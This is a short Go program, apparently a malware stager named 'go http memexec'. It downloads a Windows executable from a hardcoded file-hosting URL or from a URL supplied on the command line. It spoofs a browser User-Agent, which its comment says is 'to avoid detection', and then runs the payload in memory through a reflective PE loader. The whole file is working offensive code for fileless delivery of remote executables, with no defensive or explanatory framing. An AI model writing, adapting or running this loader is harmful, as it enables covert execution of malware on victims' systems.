package main

import (
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	runpe "runpe/gorunpe"
)

const (
	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
	defaultDownloadURL = "https://tmpfiles.org/dl/28532342/hehe.exe"
	
	projectName = "go http memexec"
	version     = "1.0.0"
)

func main() {
	// Determine downloadURL based on command-line arguments
	var downloadURL string
	if len(os.Args) < 2 {
		downloadURL = defaultDownloadURL
	} else {
		downloadURL = os.Args[1]
		// Basic URL validation
		if !strings.HasPrefix(downloadURL, "http://") && !strings.HasPrefix(downloadURL, "https://") {
			return
		}
	}

	// http client to download the payload 
	client := &http.Client{
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// allow up to 10 redirects
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
	
	// create the HTTP request with a standard user agent
	req, err := http.NewRequest("GET", downloadURL, nil)
	if err != nil {
		return
	}
	
	// set a common User-Agent to avoid detection
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")
	
	// Send the HTTP request
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	// Check for successful HTTP status code
	if resp.StatusCode != http.StatusOK {
		return
	}
	
	// Read the payload into memory
	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	
	// Validate we actually got data
	if len(payload) < 512 {
		return
	}
	
	// Execute the payload in memory using the pure Go reflective PE loader
	_ = runpe.ExecuteInMemory(payload)
}